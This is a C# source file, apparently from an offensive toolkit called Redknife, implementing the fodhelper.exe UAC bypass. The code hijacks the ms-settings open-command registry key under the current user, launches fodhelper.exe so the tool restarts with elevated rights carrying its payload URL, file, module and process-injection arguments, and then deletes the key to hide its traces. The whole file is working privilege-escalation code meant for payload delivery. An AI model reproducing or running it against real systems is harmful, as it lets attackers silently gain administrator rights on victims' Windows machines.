using System;
using System.Diagnostics;

using Microsoft.Win32;

namespace Redknife.Escalation
{
    public class FODHelper : BaseEscalationMethod
    {

        private static string FODHELPER_REG_KEY = @"HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command";

        public FODHelper(RedknifeArgs args) : base(args)
        {

        }

        public override void Execute()
        {
            string cmd = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            // TODO: Better way of serialising startup args
            if (this.args.UseEvasion) cmd += " --use-evasion";
            if (this.args.PayloadURL != null) cmd += String.Format(" --url {0}", this.args.PayloadURL);
            if (this.args.PayloadFile != null) cmd += String.Format(" --file {0}", this.args.PayloadFile);
            if (this.args.PayloadString != null) cmd += String.Format("--payload {0}", this.args.PayloadString); 
            if (this.args.ModuleName != null) cmd += String.Format(" --module {0}", this.args.ModuleName);
            if (this.args.Transforms != null && this.args.Transforms.Length > 0) cmd += String.Format(" --transforms {0}", String.Join(",", this.args.Transforms));
            if (this.args.ProcessName != null) cmd += String.Format(" --process {0}", this.args.ProcessName);
            if (this.args.PID.HasValue) cmd += String.Format(" --pid {0}", this.args.PID);

            LogUtil.Info("Relaunching Redknife with path/args: {0}", 0, cmd);

            LogUtil.Info("Setting registry keys", 1);
            Registry.SetValue(FODHELPER_REG_KEY, null, cmd);
            Registry.SetValue(FODHELPER_REG_KEY, "DelegateExecute", "");

            LogUtil.Info("Launching FodHelper.exe", 1);
            Process.Start(@"C:\Windows\System32\fodhelper.exe");

            LogUtil.Info("Sleeping for 2 seconds", 1);
            System.Threading.Thread.Sleep(2000);

            LogUtil.Info("Removing registry keys", 1);
            try
            {
                // Keys might already have been deleted by fodhelper 
                Registry.CurrentUser.DeleteSubKeyTree(FODHELPER_REG_KEY);
                Registry.CurrentUser.Close();
            }
            catch (Exception ex) {
                LogUtil.Error("Exception while executing FOD Helper escalation: {0}", 0, ex.ToString());
            }
        }

        public new bool ShouldStopExecution()
        {
            return true;
        }
    }
}
